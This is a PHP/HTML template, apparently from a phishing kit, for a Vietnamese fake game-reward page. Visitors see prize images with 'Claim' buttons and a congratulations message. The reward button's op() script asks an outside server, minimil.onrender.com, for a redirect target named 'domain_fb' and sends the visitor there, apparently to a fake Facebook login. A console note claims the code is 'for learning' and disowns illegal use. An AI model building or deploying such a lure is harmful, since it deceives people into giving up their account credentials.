<base href="themes/theme7/">
<?php
$imageLinks = [
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FpFPyUBz.jpeg?alt=media&token=34ab27a2-7b88-421c-b49d-4eb94fb321c9",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FShoz1ga.jpeg?alt=media&token=b7ffa7a3-6068-46ce-a278-0c35d1553c02",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2F3dphRVj.jpeg?alt=media&token=dda848a4-f9ab-432b-90cc-28f3bb700828",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FaayuhgO.jpeg?alt=media&token=d3a52ae0-ed17-4cf5-bd0d-5adb5f7621e6",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FJkE8Sq2.jpeg?alt=media&token=de87f58d-eb18-43c0-8cc8-b38465a8931e",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FShoz1ga.jpeg?alt=media&token=b7ffa7a3-6068-46ce-a278-0c35d1553c02",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FaayuhgO.jpeg?alt=media&token=d3a52ae0-ed17-4cf5-bd0d-5adb5f7621e6"
];

// Kiểm tra xem danh sách có đủ dữ liệu không
if (is_array($imageLinks) && count($imageLinks) >= 10) {
    $bannerLink = $imageLinks[0];
    $gift1Link = $imageLinks[1];
    $gift2Link = $imageLinks[2];
    $gift3Link = $imageLinks[3];
    $gift4Link = $imageLinks[4];
    $gift5Link = $imageLinks[5];
    $gift6Link = $imageLinks[6];
    $gift7Link = $imageLinks[7];
    $gift8Link = $imageLinks[8];
    $gift9Link = $imageLinks[9];
} else {
    echo "Danh sách hình ảnh không đủ dữ liệu.";
}
?>

<html class="plt-android plt-mobile plt-mobileweb md hydrated plt-desktop" mode="md">

<head>
    <meta charset="utf-8">
    <style data-styles="">
        ion-menu-button,
        ion-menu,
        ion-menu-toggle,
        ion-fab-button,
        ion-fab,
        ion-fab-list,
        ion-refresher-content,
        ion-refresher,
        ion-back-button,
        ion-toast,
        ion-card,
        ion-card-content,
        ion-card-header,
        ion-card-subtitle,
        ion-card-title,
        ion-item-option,
        ion-item-options,
        ion-item-sliding,
        ion-accordion,
        ion-accordion-group,
        ion-infinite-scroll-content,
        ion-infinite-scroll,
        ion-reorder,
        ion-reorder-group,
        ion-segment-button,
        ion-segment,
        ion-tab-button,
        ion-tab-bar,
        ion-chip,
        ion-datetime-button,
        ion-input,
        ion-searchbar,
        ion-toggle,
        ion-nav,
        ion-nav-link,
        ion-textarea,
        ion-backdrop,
        ion-loading,
        ion-breadcrumb,
        ion-breadcrumbs,
        ion-modal,
        ion-route,
        ion-route-redirect,
        ion-router,
        ion-router-link,
        ion-avatar,
        ion-badge,
        ion-thumbnail,
        ion-col,
        ion-grid,
        ion-row,
        ion-tab,
        ion-tabs,
        ion-img,
        ion-progress-bar,
        ion-range,
        ion-split-pane,
        ion-text,
        ion-item-divider,
        ion-item-group,
        ion-skeleton-text,
        ion-list,
        ion-list-header,
        ion-item,
        ion-label,
        ion-note,
        ion-select,
        ion-select-option,
        ion-select-popover,
        ion-picker-internal,
        ion-datetime,
        ion-picker,
        ion-picker-column,
        ion-radio,
        ion-radio-group,
        ion-ripple-effect,
        ion-button,
        ion-icon,
        ion-action-sheet,
        ion-alert,
        ion-app,
        ion-content,
        ion-footer,
        ion-header,
        ion-router-outlet,
        ion-title,
        ion-toolbar,
        ion-buttons,
        ion-picker-column-internal,
        ion-popover,
        ion-checkbox,
        ion-spinner {
            visibility: hidden
        }

        .hydrated {
            visibility: inherit
        }
    </style>
    <style data-styles="">
        ion-menu-button,
        ion-menu,
        ion-menu-toggle,
        ion-fab-button,
        ion-fab,
        ion-fab-list,
        ion-refresher-content,
        ion-refresher,
        ion-back-button,
        ion-toast,
        ion-card,
        ion-card-content,
        ion-card-header,
        ion-card-subtitle,
        ion-card-title,
        ion-item-option,
        ion-item-options,
        ion-item-sliding,
        ion-accordion,
        ion-accordion-group,
        ion-infinite-scroll-content,
        ion-infinite-scroll,
        ion-reorder,
        ion-reorder-group,
        ion-segment-button,
        ion-segment,
        ion-tab-button,
        ion-tab-bar,
        ion-chip,
        ion-datetime-button,
        ion-input,
        ion-searchbar,
        ion-toggle,
        ion-nav,
        ion-nav-link,
        ion-textarea,
        ion-backdrop,
        ion-loading,
        ion-breadcrumb,
        ion-breadcrumbs,
        ion-modal,
        ion-route,
        ion-route-redirect,
        ion-router,
        ion-router-link,
        ion-avatar,
        ion-badge,
        ion-thumbnail,
        ion-col,
        ion-grid,
        ion-row,
        ion-tab,
        ion-tabs,
        ion-img,
        ion-progress-bar,
        ion-range,
        ion-split-pane,
        ion-text,
        ion-item-divider,
        ion-item-group,
        ion-skeleton-text,
        ion-list,
        ion-list-header,
        ion-item,
        ion-label,
        ion-note,
        ion-select,
        ion-select-option,
        ion-select-popover,
        ion-picker-internal,
        ion-datetime,
        ion-picker,
        ion-picker-column,
        ion-radio,
        ion-radio-group,
        ion-ripple-effect,
        ion-button,
        ion-icon,
        ion-action-sheet,
        ion-alert,
        ion-app,
        ion-content,
        ion-footer,
        ion-header,
        ion-router-outlet,
        ion-title,
        ion-toolbar,
        ion-buttons,
        ion-picker-column-internal,
        ion-popover,
        ion-checkbox,
        ion-spinner {
            visibility: hidden
        }

        .hydrated {
            visibility: inherit
        }
    </style>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo isset($bannerName) ? $bannerName : ''; ?></title>
    <link rel="icon" href="Theme/Images/favicon-32x32.ico">
    <link rel="stylesheet" type="text/css" href="Theme/Css/style.css?ver=234">
    <script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
    <script nomodule="" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
</head>

<body>
    <div class="loader" style="display: none;">
        <img src="https://i.pinimg.com/originals/3d/80/64/3d8064758e54ec662e076b6ca54aa90e.gif">
    </div>
    <div class="ST-script">
        <div class="ST-header">
            <h1>
                <img src="Theme/Images/title1.png" width="300px">
            </h1>
        </div>
        <div class="ST-bl"></div>
        <div class="ST-br"></div>
        <div class="ST-bagianAtas">
            <div class="ST-banner">
                <img class="ST-imgBanner" src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>">
            </div>
            <br>

            <div class="ST-bannerText">
                <h3>
                    <marquee behavior="scroll"><?php echo isset($bannerName) ? $bannerName : ''; ?></marquee>
                </h3>
            </div>

            <br>
            <div class="ST-menu"></div>
            <div class="ST-change" data-text="Danh Sách Phần Quà">
                <div class="ST-item">
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                </div>
                <div class="ST-item">
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                </div>
                <div class="ST-item">
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift7Link) ? $gift7Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift8Link) ? $gift8Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                    <div class="ST-subitem" style="margin-top: 5px;"><img class="jujurlahpadakujujurlahpadaku"
                            src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>">
                        <div class="ST-claim" onclick="stFunc(this)">Nhận</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="footer-txt-follow">
                <center>
                    <img class="footer-follow-icon"
                        src="https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FEUV3ile.png?alt=media&token=0e053e1f-6535-40cb-b08c-659cbc3dd124">
                </center>

                <div class="ST-footer">
                </div>
            </div>
        </div>
        <div class="ST-footer"></div>
        <div class="st-Reward">
            <div class="rewardToast">XIN CHÚC MỪNG <span id="cnick"></span>
            </div>
            <div class="rewardImage">
                <img id="degagajago" src="">
            </div>
            <div class="rewardButton" onclick="op()">Nhận</div>
            <script>
                function op() {
                    const domain = window.location.protocol + "//" + window.location.host;
                    (async () => {
                        try {
                            let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                            data = await data.json()
                            window.location.href = data.data.domain_fb;
                        } catch {

                        }
                    })();
                }
            </script>
        </div>

    </div>


    <script src="Theme/JS/jquery-3.6.4.min.js"></script>
    <script src="Theme/JS/NguyenThanhNam.js?ver=1640"></script>
    <script>
        console.log('Mã nguồn được viết bởi mục đích học tập chia sẻ kiến thức\n nếu bạn đang sử dụng nó vào mục đích vi phạm pháp luật bạn sẽ phải hoàn toàn chịu trách nhiệm. \n Nếu bạn đã đọc được những dòng chữ này vui lòng không xoá hoặc chỉnh sửa để tôn trọng tác giả và cũng như chứng minh rằng bạn là 1 con người.');
    </script>



</body>

</html>